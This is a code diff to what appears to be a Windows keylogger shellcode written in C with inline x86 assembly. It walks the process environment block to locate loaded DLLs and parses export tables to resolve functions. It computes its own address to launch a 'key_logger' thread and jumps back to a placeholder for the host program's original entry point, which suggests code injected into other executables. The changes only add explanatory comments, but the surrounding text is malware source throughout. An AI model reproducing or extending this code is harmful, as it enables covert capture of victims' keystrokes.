@@ -55,6 +55,9 @@ __forceinline inline BOOL str_cmp2(PCHAR str1, PCHAR str2)
 
 __forceinline LPVOID get_func_by_name(LPVOID dll, char* func_name)
 {
+	/// <summary>
+	/// search through the export table of dll to find correct function.
+	/// </summary>
 	IMAGE_DOS_HEADER* dll_dos_header = (IMAGE_DOS_HEADER*)dll;
 	if (dll_dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
 		return NULL;
@@ -70,14 +73,14 @@ __forceinline LPVOID get_func_by_name(LPVOID dll, char* func_name)
 	DWORD funcsListRVA = exp->AddressOfFunctions;
 	DWORD funcNamesListRVA = exp->AddressOfNames;
 	DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
-	//go through names:
+	//Go through functions names:
 	for (SIZE_T i = 0; i < namesCount; i++) {
 		DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)dll + i * sizeof(DWORD));
 		WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)dll + i * sizeof(WORD));
 		DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)dll + (*nameIndex) * sizeof(DWORD));
 		LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)dll);
 		if (str_cmp2(func_name, curr_name))
-			//found
+			// Found right function
 			return (BYTE*)dll + (*funcRVA);
 	}
 	return NULL;
@@ -85,11 +88,11 @@ __forceinline LPVOID get_func_by_name(LPVOID dll, char* func_name)
 
 __forceinline LPVOID get_module_by_name(PWCHAR module_name)
 {
-	PPEB peb;
+	PPEB peb; // PEB represent process environment block 
 	peb = 0;
 	_asm
 	{
-		mov eax, fs: [0x30]
+		mov eax, fs: [0x30] // This line should be change  if the program is 64 bit
 		mov[peb], eax
 	}
 
@@ -98,6 +101,7 @@ __forceinline LPVOID get_module_by_name(PWCHAR module_name)
 	PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
 	PLDR_DATA_TABLE_ENTRY curr_module = Flink;
 	PWCHAR curr_name = NULL;
+	// going through every dll that the process uses.
 	while (curr_module != NULL && curr_module->BaseAddress != NULL) {
 		if (curr_module->BaseDllName.Buffer == NULL) continue;
 		curr_name = curr_module->BaseDllName.Buffer;
@@ -112,6 +116,7 @@ __forceinline LPVOID get_module_by_name(PWCHAR module_name)
 
 __forceinline void stuck_thread()
 {
+	// Desperate way to debug shellcode.
 	int counter = 0;
 	while (1)
 		counter++;
@@ -322,11 +327,11 @@ int shellcode(VOID)
 		call get_current_ip
 		get_current_ip :
 		mov[tmp2], eax
-			pop eax
+			pop eax // eax now got get_current_ip line address.
 			// Hard coded bytes count between get_current_ip to key_logger_start.
 			add eax, 27
-			mov[thread_start_address], eax
-			mov eax, [tmp2]
+			mov[thread_start_address], eax // Store keylogger function in thread_start_address
+			mov eax, [tmp2] // keep eax.
 			key_logger_start:
 	}
 	goto create_thread;
@@ -350,6 +355,6 @@ int shellcode(VOID)
 end:
 	_asm
 	{
-		mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
+		mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER // This line will be modified to jump to original start address 
 	}
 }
